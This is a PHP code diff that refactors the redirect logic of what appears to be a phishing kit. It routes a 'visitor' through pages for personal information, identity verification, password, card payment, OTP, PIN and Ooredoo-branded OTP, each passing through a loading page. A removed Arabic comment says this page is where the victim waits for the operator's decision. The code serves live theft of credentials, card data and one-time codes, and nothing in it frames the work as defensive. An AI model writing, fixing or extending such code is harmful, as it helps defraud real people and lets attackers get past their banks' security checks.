@@ -33,32 +33,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     }
 
-    if ($current_page === 'index.php') {
-        header("Location: update_info.php?visitor_id=$visitor_id");
+    $redirects = [
+        'index.php' => 'update_info.php',
+        'update_info.php' => 'identity_verification.php',
+        'identity_verification.php' => 'personal_info.php',
+        'personal_info.php' => 'password.php',
+        'password.php' => 'payment.php'
+    ];
+
+    if (isset($redirects[$current_page])) {
+        $next = $redirects[$current_page];
+        header("Location: loading.php?visitor_id=$visitor_id&next=$next");
         exit;
     }
 
-    if ($current_page === 'update_info.php') {
-        header("Location: identity_verification.php?visitor_id=$visitor_id");
-        exit;
-    }
-
-    if ($current_page === 'identity_verification.php') {
-        header("Location: personal_info.php?visitor_id=$visitor_id");
-        exit;
-    }
-
-    if ($current_page === 'personal_info.php') {
-        header("Location: password.php?visitor_id=$visitor_id");
-        exit;
-    }
-
-    if ($current_page === 'password.php') {
-        header("Location: payment.php?visitor_id=$visitor_id");
-        exit;
-    }
-
-    // بدءاً من صفحة البطاقة (payment.php)، يدخل العميل في صفحة التحميل لانتظار قرار الأدمن
+    // الخطوات المتأخرة (الدفع، OTP، PIN، Ooredoo)
     $next_step = getNextStep($current_page);
     header("Location: loading.php?visitor_id=$visitor_id&next=$next_step");
     exit;
@@ -70,6 +59,14 @@ function getNextStep($current) {
     if (strpos($current, 'pin.php') !== false) return 'ooredoo.php';
     if (strpos($current, 'ooredoo.php') !== false) return 'otp_ooredoo.php';
     if (strpos($current, 'otp_ooredoo.php') !== false) return 'success.php';
+    
+    // الأمان في حالة عدم التطابق
+    if (strpos($current, 'index.php') !== false) return 'update_info.php';
+    if (strpos($current, 'update_info.php') !== false) return 'identity_verification.php';
+    if (strpos($current, 'identity_verification.php') !== false) return 'personal_info.php';
+    if (strpos($current, 'personal_info.php') !== false) return 'password.php';
+    if (strpos($current, 'password.php') !== false) return 'payment.php';
+    
     return 'success.php';
 }
 ?>
